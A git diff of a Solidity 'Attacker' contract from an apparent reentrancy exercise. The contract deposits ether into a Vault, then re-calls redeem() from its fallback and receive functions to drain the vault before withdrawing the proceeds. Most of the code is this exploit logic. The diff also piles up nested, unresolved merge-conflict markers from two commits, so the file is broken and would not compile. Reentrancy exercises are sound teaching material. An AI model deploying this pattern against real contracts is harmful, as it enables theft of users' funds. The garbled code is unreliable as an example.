@@ -2,6 +2,7 @@
 pragma solidity 0.8.20;
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 import "@openzeppelin/contracts/access/Ownable.sol";
 
 import "./Vault.sol";
@@ -20,11 +21,29 @@ contract Attacker is Ownable {
 
     event ValueStored(uint amount);
 =======
+=======
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+>>>>>>> ba9c184 (reentrancy exercice with unit testing & tested on remix)
 import "./Vault.sol";
+ 
 
-contract Attacker {
+/**
+ * @title A contract to experiment the reentrancy attack
+ * @author Adrien L. <hladrien@gmail.com>
+ * @notice It should be executed in 3 steps:
+ *  1) storing a little bit of ether with store()
+ *  2) starting the attack with a redeem() call
+ *  3) a withdraw of the extracted fund 
+ */
+contract Attacker is Ownable {
+    error WithdrawFailure();
 
+<<<<<<< HEAD
 >>>>>>> dc24363 (rentrancy exercice)
+=======
+    event ValueStored(uint amount);
+>>>>>>> ba9c184 (reentrancy exercice with unit testing & tested on remix)
     event RedeemCall(uint callCount);
     event FallbackCall(uint callCount, uint value);
   
@@ -32,6 +51,7 @@ contract Attacker {
     uint redeemCallCount;
     uint fallbackCallCount;
  
+<<<<<<< HEAD
 <<<<<<< HEAD
     /**
      * @notice Init deployed Vault contract based on the contract address
@@ -64,28 +84,50 @@ contract Attacker {
      */
 =======
 
+=======
+    /**
+     * @notice Init deployed Vault contract based on the contract address
+     */
+>>>>>>> ba9c184 (reentrancy exercice with unit testing & tested on remix)
     constructor(address _contractAddr) {
-        // 1) Init deployed Vault contract from contract address
         vault = Vault(_contractAddr);
     }
 
     fallback() external payable {
-        emit FallbackCall(++fallbackCallCount, msg.value);
         this.redeem();
+        emit FallbackCall(++fallbackCallCount, msg.value);
     }
- 
-    // 2) Store a little to be able to do a reddem
-    function store() external payable {
+  
+    receive() external payable {
+        this.redeem();
+        emit FallbackCall(++fallbackCallCount, msg.value);
+    }
+  
+    /**
+     * @notice Store ether to Vault contract from this contract
+     */
+    function store() external payable onlyOwner {
         vault.store{value: msg.value}();
+        emit ValueStored(msg.value);
     }
+<<<<<<< HEAD
       
     // 3) start the real attack with a first redeem call
 >>>>>>> dc24363 (rentrancy exercice)
+=======
+       
+    /**
+     * @notice start the real attack with a first redeem call
+     */
+>>>>>>> ba9c184 (reentrancy exercice with unit testing & tested on remix)
     function redeem() external {
         emit RedeemCall(++redeemCallCount);
         vault.redeem();
     }
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> ba9c184 (reentrancy exercice with unit testing & tested on remix)
     
     function getSenderBalance() external view onlyOwner returns (uint) {
         return address(msg.sender).balance;
@@ -108,6 +150,9 @@ contract Attacker {
             revert WithdrawFailure();
         }
     }
+<<<<<<< HEAD
 =======
 >>>>>>> dc24363 (rentrancy exercice)
+=======
+>>>>>>> ba9c184 (reentrancy exercice with unit testing & tested on remix)
 }
